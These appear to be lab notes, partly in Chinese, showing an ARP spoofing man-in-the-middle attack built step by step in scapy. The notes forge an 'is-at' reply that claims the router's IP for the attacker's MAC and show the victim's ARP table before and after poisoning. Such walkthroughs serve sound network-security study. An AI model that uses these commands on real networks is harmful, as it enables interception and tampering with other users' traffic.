## Man in the middle - Arpspoofer

- Router info
    ```bash
    $ netstat -nr                   
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
    0.0.0.0         192.168.0.1     0.0.0.0         UG        0 0          0 eth0
    192.168.0.0     0.0.0.0         255.255.255.0   U         0 0          0 eth0
    ```

- scapy example
    ```python
    $ scapy

    >>> ls(ARP)
    hwtype     : XShortField                         = ('1')
    ptype      : XShortEnumField                     = ('2048')
    hwlen      : FieldLenField                       = ('None')
    plen       : FieldLenField                       = ('None')
    op         : ShortEnumField                      = ('1')
    hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')
    psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')
    hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')
    pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')
    >>> packet = ARP(pdst='192.168.0.13')
    >>> packet.show()
    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = who-has
    hwsrc     = 52:54:00:94:b6:27
    psrc      = 192.168.0.31
    hwdst     = 00:00:00:00:00:00
    pdst      = 192.168.0.13
    >>> packet.op = 2
    >>> packet.show()
    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = is-at
    hwsrc     = 52:54:00:94:b6:27
    psrc      = 192.168.0.31
    hwdst     = 00:00:00:00:00:00
    pdst      = 192.168.0.13
    ```

- Manually sending malicious ARP packets

    ```python
    >>> ls(Ether)
    dst        : DestMACField                        = ('None')
    src        : SourceMACField                      = ('None')
    type       : XShortEnumField                     = ('36864')
    >>> packet = Ether(dst='ff:ff:ff:ff:ff:ff')
    >>> packet.show()
    ###[ Ethernet ]### 
    dst       = ff:ff:ff:ff:ff:ff
    src       = 52:54:00:94:b6:27
    type      = 0x9000

    >>> broadcase = Ether(dst='ff:ff:ff:ff:ff:ff')
    >>> arp_layer = ARP(pdst='192.168.0.20')  # target_ip
    >>> arp_layer.show()
    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = who-has
    hwsrc     = 52:54:00:94:b6:27
    psrc      = 192.168.0.31
    hwdst     = 00:00:00:00:00:00
    pdst      = 192.168.0.20

    >>> entire_packet = broadcase/arp_layer
    >>> entire_packet.show()
    ###[ Ethernet ]### 
    dst       = ff:ff:ff:ff:ff:ff
    src       = 52:54:00:94:b6:27
    type      = ARP
    ###[ ARP ]### 
        hwtype    = 0x1
        ptype     = IPv4
        hwlen     = None
        plen      = None
        op        = who-has
        hwsrc     = 52:54:00:94:b6:27
        psrc      = 192.168.0.31
        hwdst     = 00:00:00:00:00:00
        pdst      = 192.168.0.20

    >>> answer = srp(entire_packet, timeout=2, verbose=True)[0]
    Begin emission:
    Finished sending 1 packets.

    Received 1 packets, got 1 answers, remaining 0 packets
    >>> print(answer)
    <Results: TCP:0 UDP:0 ICMP:0 Other:1>
    >>> print(answer[0])
    QueryAnswer(query=<Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP  pdst=192.168.0.20 |>>, answer=<Ether  dst=52:54:00:94:b6:27 src=52:54:00:08:8c:94 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=52:54:00:08:8c:94 psrc=192.168.0.20 hwdst=52:54:00:94:b6:27 pdst=192.168.0.31 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
    >>> print(answer[0][1].show)
    <bound method Packet.show of <Ether  dst=52:54:00:94:b6:27 src=52:54:00:08:8c:94 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=52:54:00:08:8c:94 psrc=192.168.0.20 hwdst=52:54:00:94:b6:27 pdst=192.168.0.31 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>>
    >>> target_mac_address = answer[0][1].hwsrc
    >>> print(target_mac_address)
    52:54:00:08:8c:94
    >>> packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.0.20', psrc='192.168.0.1')
    >>> packet.show()
    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = is-at
    hwsrc     = 52:54:00:94:b6:27
    psrc      = 192.168.0.1
    hwdst     = 52:54:00:08:8c:94
    pdst      = 192.168.0.20

    >>> send(packet, verbose=False)  # 攻擊
    >>> 
    ```

    攻擊前
    ```cmd
    C:\Users\MT5>arp -a

    介面: 192.168.0.20 --- 0xd
    網際網路網址          實體位置               類型
    192.168.0.1           22-6a-94-1e-23-a4     動態  # router
    192.168.0.10          c0-25-2f-9a-98-8d     動態
    192.168.0.13          0e-af-8a-8f-22-01     動態
    192.168.0.31          52-54-00-94-b6-27     動態  # kali
    192.168.0.63          0e-af-8a-8f-22-01     動態
    192.168.0.255         ff-ff-ff-ff-ff-ff     靜態
    224.0.0.22            01-00-5e-00-00-16     靜態
    224.0.0.251           01-00-5e-00-00-fb     靜態
    224.0.0.252           01-00-5e-00-00-fc     靜態
    239.255.255.250       01-00-5e-7f-ff-fa     靜態
    255.255.255.255       ff-ff-ff-ff-ff-ff     靜態

    C:\Users\MT5>
    ```

    攻擊後
    ```
    C:\Users\MT5>arp -a

    介面: 192.168.0.20 --- 0xd
    網際網路網址          實體位置               類型
    192.168.0.1           52-54-00-94-b6-27     動態  # router
    192.168.0.10          c0-25-2f-9a-98-8d     動態
    192.168.0.13          0e-af-8a-8f-22-01     動態
    192.168.0.31          52-54-00-94-b6-27     動態  # kali
    192.168.0.63          0e-af-8a-8f-22-01     動態
    192.168.0.255         ff-ff-ff-ff-ff-ff     靜態
    224.0.0.22            01-00-5e-00-00-16     靜態
    224.0.0.251           01-00-5e-00-00-fb     靜態
    224.0.0.252           01-00-5e-00-00-fc     靜態
    239.255.255.250       01-00-5e-7f-ff-fa     靜態
    255.255.255.255       ff-ff-ff-ff-ff-ff     靜態

    C:\Users\MT5>
    ```

    > 一小段時間後就會恢復
